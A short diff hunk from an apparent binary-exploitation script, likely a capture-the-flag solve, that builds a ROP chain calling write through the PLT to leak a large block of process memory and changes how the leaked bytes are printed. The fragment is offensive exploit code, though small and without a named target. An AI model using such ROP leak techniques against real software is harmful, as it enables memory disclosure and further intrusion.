@@ -20,5 +20,5 @@ buf = rop.call_plt('write', 1, ref_addr, 0x200000)
 buf += rop.fill(100, buf)
 
 p.write(buf)
-print p.strings()
+print p.pipe_output('strings', '-tx')
 p.close()
